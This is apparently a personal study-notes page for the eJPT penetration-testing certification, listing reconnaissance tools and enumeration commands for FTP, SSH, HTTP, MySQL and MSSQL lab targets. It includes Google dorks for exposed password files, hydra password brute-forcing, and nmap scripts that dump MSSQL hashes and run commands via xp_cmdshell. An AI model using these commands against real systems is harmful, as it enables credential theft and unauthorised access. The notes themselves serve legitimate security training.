---
title: 'Enumeration'
description: 'A resume from INE Learning Path for eJPT cert and some self notes to get success'
pubDate: 'May 12 2023'
heroImage: '/enumeration.png'
slug: 'trip/enumeration'
---

## Passive information gathering

**WAF:** WAFWOOF Github tool.

Subdomain Enumeration

    - Gobuster
    - wfuzz
    - etc

**Google Dorks**

- http://exploit-db.com
- site: gov._ intitle: "index of" _.csv passwords

[google dorking](https://www.googleguide.com/advanced_operators_reference.html)

[google hacking](https://www.exploit-db.com/google-hacking-database)
```bash


```

**Email Harvesting**

    - theHarvester
    # The tool gathers names, emails, IPs, subdomains, and URLs by using
    multiple public resources that include:

**Leaked password dbs**

    - haveibeenpwned.com
    - firepwd

## Active information gathering

DNS Zone Transfers

    - dnsenum
    - dig
    - fierce

    Host, Port, Services
    - nmap

### Info

Windows Recon: Nmap Host Discovery
Winwos Reconnaissance: SMB

## Footprinting and scanning

### Protocol

What protocol matches MAC addresses to IP addresses?

**arp**
**smb**
**icmp**
**http**

### Tools

    - Wireshark
    - ARP-SCAN
    - PING
    - FPING
    - NMAP nmap -sn 10.10.33.14/24
    - ZENMAP (GUI)
    - RustScan
    - Masscan

<img src="https://www.ictshore.com/wp-content/uploads/2016/12/1017-02-TCP_States_in_a_connection.png" width=864px style="background-color: #eee" >

## Enumeration

### FTP

File transfer protocol uses TCP port 21.

```bash

# find ftp potentially script from nmap.

ls -la /usr/share/nmap/scripts | grep ftp-*

# Using hydra brute-force.
$hydra -L /usr/share/metasploit-framework/data/wordlists/users.txt -P /usr/share/metasploit-framework/data/wordlists/pass.txt target -t 4 ftp(protocol)

# ftp target
and we have anonymous login

$nmap target -p21 --script ftp-anon
```

### SSH

```bash
$nmap target -p22 --script ssh-hostkey --script-args ssh_hostkey=full
#ssh-rsa: .*?
#verify is student have password
$nmap target -p22 --script ssh-auth-methods
--script-args="ssh.user=student"

#attack

$hydra -l student -P /usr/rockyou.txt target ssh(protocol)

# How many “encryption_algorithms”?
nmap --script ssh2-enum-algos 192.201.39.3

# What is the ssh-rsa host key being used by the SSH server.
nmap --script ssh-hostkey --script-args ssh_hostkey=full 192.201.39.3

# Which authentication method is being used by the SSH server for user “rosa”.
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=rosa" 192.201.39.3
```

### HTTP

http target

```bash
find directorios default
$dirb target

$nmap target -sCV -p80 --script http-headers
- http-enum
- http-methods
- http-webdav-scan

```

### SQL

```bash

$nmap target -sCV -p3306 --script=mysql-empty-password

$nmap target -sCV -p3306 --script=mysql-users --script-args="mysqluser='root', mysqlpass=''"

$nmap target -sCV -p3306 --script=mysql-variables --script-args="mysqluser='root', mysqlpass=''"

$nmap target -sCV -p3306 --script=mysql-audit --script-args="mysql-audit.username='root',mysql-audit.password='', mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'"

#attack

$hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target mysql(protocol)

#WINDOWS

$nmap target -p1433 --script ms-sql-info

$nmap target -p1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433

$nmap target -p1433 --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/common_password.txt

$nmap target -p1433 --script ms-sql-empty-password

$nmap target -p1433 --script ms-sql-query --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-query.query='SELECT * FROM master..syslogins' -oN output

$nmap target -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria

$nmap target -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="type c:\flag.txt"

```
